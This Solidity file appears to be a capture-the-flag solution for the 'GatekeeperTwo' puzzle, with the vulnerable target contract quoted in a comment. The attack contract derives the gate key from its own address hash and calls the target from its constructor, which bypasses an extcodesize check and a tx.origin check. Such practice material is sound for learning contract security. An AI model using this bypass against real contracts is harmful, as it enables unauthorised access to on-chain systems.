// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGateKeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoHack {
    constructor(IGateKeeperTwo target) {

        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 b = type(uint64).max ^ a;
        bytes8 key = bytes8(b);
        require(target.enter(key), "failed");
    }
}

/*
// Target Contract
contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
*/